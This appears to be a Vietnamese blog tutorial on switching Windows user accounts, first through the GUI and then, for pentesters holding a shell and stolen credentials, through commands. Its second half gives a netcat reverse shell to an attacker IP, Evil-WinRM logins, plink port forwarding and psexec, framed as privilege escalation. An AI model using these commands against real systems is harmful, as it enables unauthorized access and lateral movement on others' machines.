Windows hay các hệ điều hành như Linux, MacOS, ... cho phép tồn tại nhiều tài khoản người dùng trên một máy. Các tài khoản đều có thể cho phép bạn tùy biến cài đặt tùy theo sở thích của mình và tách biệt so với các thành viên khác trong khi sử dụng chung máy tính. Bài viết này mình sẽ nêu một số cách để chuyển đổi tài khoản người dùng trên Windows, nghe có vẻ khá đơn giản đúng không :D
## Sử dụng giao diện
### Windows 10
#### Cách 1
Nhấn Ctrl + ALT + Del và click Switch user

![](https://images.viblo.asia/11d57dac-5995-4079-9669-0635c858f9ac.png)

#### Cách 2
Vào start chọn avatar (user account button) trên Start Menu sau đó chọn tài khoản cần chuyển.

![](https://images.viblo.asia/4bb5b495-0b27-4935-83cf-af84e33f453f.png)

#### Cách 3
Nhấn Windows + L để khóa tài khoản hiện tại và được trở về màn hình hóa, nhấn bàn phím hoặc chuột rồi bạn sẽ thấy màn hình đăng nhập. Chọn tài khoản mà bạn muốn sử dụng và đăng nhập 

![](https://images.viblo.asia/7bceb44a-0ce9-41e3-83ec-15aed5951309.jpg)

> **Windows 8** và **Windows 7** có thể sử dụng 1 số cách bên trên, tuy nhiên các thao tác với giao diện khác biệt hơn 1 chút
## Sử dụng câu lệnh
Đối với pentester khi lên được shell trên máy Windows thì họ sẽ chỉ sử dụng được **cmd** hoặc **powershell** (trừ trường hợp lấy được remote desktop Windows). Vậy làm cách nào để switch user khi mình có thể lấy được tài khoản mật khẩu của 1 trong số những user trên Windows.

Không giống như trên Linux hoặc MacOS thì ta có thể chuyển đổi tài khoản bằng lệnh cực đơn giản là 
```sh
su <tên tài khoản>
```
sau đó nhập mật khẩu là ta có thể chuyển được sang tài khoản đó rồi. Vậy đối với Windows thì phải làm như thế nào?
#### Cách 1
Bước 1: Tải file `nc.exe` lên máy target chạy Windows (file `nc.exe` có sẵn trên Kali tại `/usr/share/windows-resources/binaries/nc.exe`)

Bước 2:  Sử dụng powershell trên máy target. Gõ powershell trên command line để khởi động powershell.

Bước 3: Copy đoạn code này paste lên máy target (Ở đây ví dụ có tài khoản mật khẩu là `UserX:P@ssW0rd`)
```powershell
$Username = 'UserX'
$Password = 'P@ssW0rd'
$pass = ConvertTo-SecureString -AsPlainText $Password -Force #Not recommended, but if rights are set on that location you can use it like this, otherwise encrypt it (recommended).
$Cred = New-Object System.Management.Automation.PSCredential -ArgumentList $Username,$pass

#You can use it like this, or use it with other commands and ' -Credential ...' 
Invoke-Command -ComputerName "DeviceName" -Credential $Cred -ScriptBlock {#Your Code} 
```
Với phần `#Your code` sẽ thực thi lệnh với quyền là của tài khoản `UserX` (tương tự đối với `sudo -u` trên Linux) nên sử dụng reverse shell đến máy pentester để sử dụng tài khoản `UserX` 

Ví dụ code
```
C:\test\nc.exe -e cmd.exe 10.10.14.5 4444
```
Với `10.10.14.5` là địa chỉ ip pentester, `4444` là port đang lắng nghe ở máy của pentester

#### Cách 2
Cách trên thì sử dụng khi cổng 5896 đang không được bật. Cổng 5896 là cổng dịch vụ `winrm` (Microsoft Windows Remote Management) [https://www.speedguide.net/port.php?port=5986](https://www.speedguide.net/port.php?port=5986)

Nếu cổng 5896 được bật thì sử dụng `Evil-WinRM` để switch user

Evil-WinRM  sử dụng ruby các bạn có thể tải và cài đặt tại đây [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)

```sh
evil-winrm -i 10.10.10.18 -u Administrator -p PassW0rd
```

Có 1 cách khác có thể bật cổng 5986 lên khi máy chủ đang chưa bật. Sử dụng Remote Port Forwarding để mở cổng 5986 thông với cổng 5986 bên máy local.

> Các bạn có thể đọc bài này của mình để hiểu cách hoạt động của Remote Port Forwarding [https://viblo.asia/p/ssh-tunneling-local-port-forwarding-va-remote-port-forwarding-07LKXJ3PlV4](https://viblo.asia/p/ssh-tunneling-local-port-forwarding-va-remote-port-forwarding-07LKXJ3PlV4)

Bước 1: Tải chương trình `plink.exe` lên target Windows, có ở sẵn Kali OS tại đường dẫn `/usr/share/windows-resources/binaries/plink.exe`

Bước 2: Khởi động dịch vụ ssh trên máy pentester

Bước 3: Gõ lệnh trên target sử dụng powershell
```powershell
.\plink.exe -l user -pw passwd -R 5985:127.0.0.1:5985 10.10.14.5
```
Với user và passwd là tài khoản mật khẩu ssh trên máy pentester, `10.10.14.5` là địa chỉ ip của máy pentester. 

Bước 4:

Sử dụng `Evil-WinRM` để kết nối tới user mình muốn
```sh
evil-winrm -i 127.0.0.1 -u Administrator -p PassW0rd
```

#### Cách 3: 
Sử dụng `psexec.exe` có thể download tại [https://docs.microsoft.com/en-us/sysinternals/downloads/psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)

```powershell
psexec.exe //domain -u UserX -p P@ssW0rd <command>
```

Vậy là mình có thể sử dụng câu lệnh với quyền của `UserX` rồi.

> Cảm ơn @testanull đã gợi ý cho mình 1 cách khá hay ;)

------
##### Trên đây là một số cách để sử dụng tài khoản khác trên Windows, nhất là đối với các bạn nào muốn leo quyền lên tài khoản cao hơn trên Win, hi vọng là bài viết có ích giúp các bạn. See you.
## Tham khảo
- https://www.computerhope.com/issues/ch001317.htm
- https://www.digitalcitizen.life/how-switch-between-user-accounts-windows-10
- https://docs.microsoft.com/en-us/sysinternals/downloads/psexec